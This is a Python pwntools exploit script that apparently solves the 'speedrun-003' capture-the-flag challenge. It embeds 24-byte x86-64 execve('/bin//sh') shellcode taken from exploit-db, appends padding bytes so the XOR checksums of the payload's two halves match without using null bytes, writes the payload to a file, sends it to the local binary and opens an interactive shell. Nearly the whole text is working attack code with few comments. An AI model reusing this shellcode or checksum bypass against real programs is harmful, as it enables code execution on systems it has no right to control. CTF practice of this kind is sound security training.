#!/usr/bin/python 
from pwn import *

s = process("./speedrun-003")
"""
with open("shellcode", "rb") as f:
    shellcode = f.read()
    #shellcode = shellcode.replace("\x00", "")
shellcode += "\x02"*7
shellcode += "\x59"
"""
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"             # 24 bytes from https://www.exploit-db.com/exploits/42179
a = 0
for i in range(15):
    a ^= ord(shellcode[i])
b = 0
for i in range(15, len(shellcode)):
    b ^= ord(shellcode[i])
print "b: " + str(b)
for i in range(5):
    b ^= 1
    shellcode += "\x01"         # because of the conditions we can't have null bytes so xor with 1 instead
b ^= a

shellcode += chr(b)
with open("payload.txt", "wb") as f:
    f.write(shellcode)
s.sendlineafter("Send me your drift", shellcode)
s.interactive()
